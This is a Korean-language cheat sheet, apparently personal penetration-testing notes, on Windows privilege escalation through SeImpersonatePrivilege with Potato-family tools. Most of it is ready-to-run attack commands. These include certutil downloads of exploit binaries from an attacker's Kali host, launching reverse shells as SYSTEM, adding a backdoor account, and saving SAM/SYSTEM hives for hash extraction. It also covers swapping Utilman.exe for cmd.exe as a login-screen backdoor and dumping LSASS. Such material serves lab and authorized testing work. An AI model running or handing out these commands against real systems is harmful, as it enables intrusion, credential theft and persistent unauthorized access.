# 06_SeImpersonatePrivilege_Potato

# 윈도우 권한상승 — SeImpersonatePrivilege (Potato 계열)

---

## 확인 및 원리

Windows의 impersonation(가장) 기능은 프로세스가 다른 사용자 토큰을 넘겨받으면 그 사용자처럼 행동하게 해준다. `SeImpersonatePrivilege`는 이 토큰을 넘겨받아 쓸 수 있는 권한이다.

Potato 계열은 공통적으로 같은 트릭을 쓴다 — SYSTEM 권한 프로세스가 공격자가 만든 엔드포인트에 연결하도록 강제하고, 인증하는 순간 그 토큰을 가로채간다. 도구마다 SYSTEM을 유인하는 방법(DCOM, BITS, Print Spooler, HTTP)만 다를 뿐이다.

```bash
whoami /priv
:: SeImpersonatePrivilege    Enabled  → Potato 계열 적용 가능
:: SeAssignPrimaryTokenPrivilege     → 동일
```

---

## 도구 선택

| 도구 | 대상 OS | 특이사항 |
| --- | --- | --- |
| PrintSpoofer | Win10, Server 2016/2019 | Print Spooler 필요 |
| GodPotato | Win8 ~ Server 2022 | .NET 필요, 권장 |
| JuicyPotato | Win7~10, Server 2008~2019 (≤1809) | CLSID 필요 |
| RoguePotato | Server 2019 (1809+) | 외부 서버 필요 |
| SweetPotato | 통합 | 자동 선택 |

---

## PrintSpoofer

```bash
:: 다운로드
certutil -urlcache -split -f http://<칼리IP>/PrintSpoofer64.exe C:\Temp\ps.exe

:: 인터랙티브 cmd
C:\Temp\ps.exe -i -c cmd

:: PowerShell
C:\Temp\ps.exe -i -c "powershell.exe"

:: 리버스쉘 실행
C:\Temp\ps.exe -c "C:\Temp\shell.exe"
```

---

## GodPotato (최신 권장)

```bash
:: 다운로드
certutil -urlcache -split -f http://<칼리IP>/GodPotato-NET4.exe C:\Temp\gp.exe

:: 명령 실행
C:\Temp\gp.exe -cmd "whoami"
C:\Temp\gp.exe -cmd "cmd /c C:\Temp\shell.exe"
C:\Temp\gp.exe -cmd "net user hacker P@ss123 /add"

:: .NET 버전별
C:\Temp\GodPotato-NET2.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato-NET35.exe -cmd "cmd /c whoami"
C:\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

---

## JuicyPotato

```bash
:: CLSID 필요(OS/버전별 다름)
:: https://github.com/ohpe/juicy-potato/tree/master/CLSID

:: Win10 기본 CLSID
C:\Temp\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Temp\shell.exe" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}

:: 다른 CLSID 시도
C:\Temp\JuicyPotato.exe -l 1337 -p C:\Temp\shell.exe -t * -c {CLSID}
```

---

## 기타 강력한 권한

```bash
:: SeBackupPrivilege → SAM/SYSTEM 복사 → 해시 추출
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

:: SeRestorePrivilege → 임의 파일 쓰기 → DLL 교체
:: SeTakeOwnershipPrivilege → 파일 소유권 탈취
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant Everyone:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
:: 로그인 화면에서 접근성 버튼 클릭 → cmd(SYSTEM)

:: SeDebugPrivilege → LSASS 덤프
:: procdump.exe -ma lsass.exe lsass.dmp

:: SeManageVolumePrivilege → System32 쓰기 → DLL hijack
```